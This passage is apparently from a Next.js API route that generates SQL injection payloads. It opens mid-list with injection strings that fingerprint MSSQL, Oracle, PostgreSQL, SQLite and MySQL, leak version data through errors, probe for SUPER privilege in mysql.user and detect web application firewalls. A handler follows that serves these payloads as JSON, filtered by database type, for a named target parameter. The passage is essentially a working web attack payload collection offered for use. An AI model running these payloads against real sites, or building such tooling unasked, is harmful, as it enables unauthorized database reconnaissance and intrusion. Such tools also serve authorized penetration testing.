        { label: "MSSQL check", payload: `' AND 1=@@ROWCOUNT--`, technique: "Fingerprint", dbms: "MSSQL", risk: "low", description: "MSSQL-specific @@ROWCOUNT global variable" },
        { label: "Oracle check", payload: `' AND 1=(SELECT 1 FROM DUAL)--`, technique: "Fingerprint", dbms: "Oracle", risk: "low", description: "Oracle DUAL table confirms Oracle DBMS" },
        { label: "PostgreSQL check", payload: `' AND 1=version()::int--`, technique: "Fingerprint", dbms: "PostgreSQL", risk: "low", description: "PostgreSQL cast operator :: fingerprint" },
        { label: "SQLite check", payload: `' AND 1=sqlite_version()--`, technique: "Fingerprint", dbms: "SQLite", risk: "low", description: "SQLite version function fingerprint" },
        { label: "Version leak error", payload: `' AND 1=convert(int,@@version)--`, technique: "Fingerprint", dbms: "MSSQL", risk: "low", description: "Trigger conversion error to leak DBMS version" },
        { label: "MySQL 8 check", payload: `' AND JSON_VALID('{}')=1--`, technique: "Fingerprint", dbms: "MySQL 8+", risk: "low", description: "JSON_VALID only exists in MySQL 8+ / MariaDB 10.2+" },
        { label: "DB user privilege", payload: `' AND (SELECT Super_priv FROM mysql.user WHERE user=user() LIMIT 1)='Y'--`, technique: "Fingerprint", dbms: "MySQL", risk: "medium", description: "Check if current DB user has SUPER privilege" },
        { label: "WAF detection", payload: `' AND 1=1 UNION SELECT NULL--`, technique: "Fingerprint", dbms: "All", risk: "low", description: "Clean payload — if blocked, WAF is active" },
      ],
    },
  ];
}

export async function GET(req: NextRequest) {
  const target = req.nextUrl.searchParams.get("q");
  const filter = req.nextUrl.searchParams.get("dbms");

  if (!target) {
    return NextResponse.json({ error: "Target parameter (param name) required" }, { status: 400 });
  }

  const categories = generateSQLiPayloads(target);

  const filtered = filter
    ? categories.map((cat) => ({
        ...cat,
        payloads: cat.payloads.filter((p) =>
          p.dbms.toLowerCase().includes(filter.toLowerCase()) || p.dbms === "All"
        ),
      })).filter((cat) => cat.payloads.length > 0)
    : categories;

  const totalPayloads = filtered.reduce((sum, cat) => sum + cat.payloads.length, 0);

  return NextResponse.json({
    target,
    dbmsFilter: filter ?? "all",
    totalCategories: filtered.length,
    totalPayloads,
    categories: filtered,
    supportedDBMS: ["MySQL", "MSSQL", "PostgreSQL", "Oracle", "SQLite", "MongoDB", "Redis"],
    timestamp: new Date().toISOString(),
  });
}
